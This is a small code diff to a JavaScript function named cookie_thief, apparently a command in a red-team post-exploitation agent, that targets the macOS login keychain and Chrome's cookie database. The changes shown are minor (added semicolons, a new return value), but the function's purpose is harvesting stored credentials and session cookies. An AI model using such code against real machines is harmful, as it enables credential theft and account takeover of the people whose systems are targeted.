@@ -6,9 +6,9 @@ exports.cookie_thief = function(task, command, params){
     var username = "";
     let browser = "chrome";
     let homedir = "/Users/";
-    let keychainpath = "Library/Keychains/login.keychain-db"
-    let chromeCookieDir = "Library/Application Support/Google/Chrome/Default/Cookies"
-    let cookiedir = "Library/Application Support/Google/Chrome/Default/Cookies"
+    let keychainpath = "Library/Keychains/login.keychain-db";
+    let chromeCookieDir = "Library/Application Support/Google/Chrome/Default/Cookies";
+    let cookiedir = "Library/Application Support/Google/Chrome/Default/Cookies";
 
     if(config.hasOwnProperty("password") && typeof config['password'] == 'string'){
         password = config['password'];
@@ -51,5 +51,5 @@ exports.cookie_thief = function(task, command, params){
     catch(error)  {
         return {'user_output': error.toString(), "completed": true, "status": "error"};
     }
-    return;
+    return keyDL_status;
 };
